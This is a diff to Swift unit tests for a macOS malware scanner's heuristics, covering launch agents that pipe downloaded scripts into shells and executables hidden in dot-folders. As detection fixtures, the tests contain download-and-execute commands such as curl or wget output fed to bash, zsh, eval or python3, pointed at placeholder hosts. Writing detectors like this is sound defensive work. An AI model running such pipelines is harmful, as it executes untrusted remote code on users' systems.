@@ -44,6 +44,24 @@ struct LaunchAgentHeuristicsTests {
         #expect(threats.named("Heuristic.LaunchAgent.RemoteScriptPipeline").count == 1)
     }
 
+    @Test func shellRunningCurlWithoutFeedingAShellIsNotFlagged() async {
+        // A health-check ping: the shell runs curl, nothing is piped back into a shell.
+        let ping = await evaluate(launchdPlist(arguments: ["/bin/sh", "-c", "curl -fsS https://hc-ping.invalid/abc"]),
+                                  extra: ["/bin/sh": .file(size: 10)])
+        #expect(ping.named("Heuristic.LaunchAgent.RemoteScriptPipeline").isEmpty)
+        let grep = await evaluate(launchdPlist(arguments: ["/bin/sh", "-c", "curl -s https://x.invalid | grep ok"]),
+                                  extra: ["/bin/sh": .file(size: 10)])
+        #expect(grep.named("Heuristic.LaunchAgent.RemoteScriptPipeline").isEmpty)
+    }
+
+    @Test func downloadFedToAShellBySubstitutionIsFlagged() {
+        #expect(Heuristics.runsDownloadedScript("/bin/bash -c bash <(curl -s http://x.invalid/a)"))
+        #expect(Heuristics.runsDownloadedScript("/bin/sh -c eval \"$(wget -qO- http://x.invalid/a)\""))
+        #expect(Heuristics.runsDownloadedScript("curl http://x.invalid/a | sudo /bin/zsh"))
+        #expect(Heuristics.runsDownloadedScript("curl http://x.invalid/a | python3"))
+        #expect(!Heuristics.runsDownloadedScript("/usr/bin/true --flag | sh"))
+    }
+
     @Test func curlAloneIsNotFlagged() async {
         let threats = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "curl", "http://x.invalid/ping"]))
         #expect(threats.isEmpty)
@@ -76,6 +94,13 @@ struct LaunchAgentHeuristicsTests {
         #expect(threats.named("Heuristic.LaunchAgent.HiddenPath").first?.severity == .medium)
         let dots = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "../relative", "./here"]))
         #expect(dots.named("Heuristic.LaunchAgent.HiddenPath").isEmpty)
+        // Well-known tool directories are not "hidden" in the suspicious sense.
+        let tools = await evaluate(launchdPlist(arguments: [
+            "/usr/bin/true", "--config=/Users/test/.config/tool/x.toml", "/Users/test/.docker/run", "/Users/test/.cargo/bin/t",
+        ]))
+        #expect(tools.named("Heuristic.LaunchAgent.HiddenPath").isEmpty)
+        let option = await evaluate(launchdPlist(arguments: ["/usr/bin/true", "--payload=/Users/test/.x/agent"]))
+        #expect(option.named("Heuristic.LaunchAgent.HiddenPath").count == 1)
     }
 
     @Test func missingProgramIsLow() async {
@@ -149,8 +174,12 @@ struct ExecutableHeuristicsTests {
     }
 
     @Test func hiddenExecutableUnderLibrary() async {
-        let hidden = await evaluate("/Users/test/Library/.cache/bin/agent", elf)
+        let hidden = await evaluate("/Users/test/Library/.updater/bin/agent", elf)
         #expect(hidden.named("Heuristic.HiddenExecutable").first?.severity == .medium)
+        // Developer tooling under ~/Library/Developer is not a hiding place.
+        let derived = "/Users/test/Library/Developer/Xcode/DerivedData/App/SourcePackages/checkouts/pkg"
+        #expect(await evaluate(derived + "/.build/debug/tool", elf).isEmpty)
+        #expect(await evaluate(derived + "/.git/hooks/tool", elf).isEmpty)
         #expect(await evaluate("/Users/test/Library/Application Support/App/agent", elf).isEmpty)
         #expect(await evaluate("/Users/test/.config/agent", elf).isEmpty)
         // Hidden *file name* alone is not a hidden folder.
